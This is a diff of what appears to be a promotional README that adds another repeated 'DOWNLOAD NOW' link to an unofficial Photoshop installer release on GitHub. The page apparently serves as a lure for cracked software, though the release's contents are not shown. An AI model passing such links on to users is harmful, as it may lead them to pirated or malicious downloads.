@@ -11,4 +11,6 @@ _
 [DOWNLOAD NOW](https://github.com/SOFTONIAX/photoshopinstaller/releases/tag/photoshop)
 -
 [DOWNLOAD NOW](https://github.com/SOFTONIAX/photoshopinstaller/releases/tag/photoshop)
+-
+[DOWNLOAD NOW](https://github.com/SOFTONIAX/photoshopinstaller/releases/tag/photoshop)
 ---
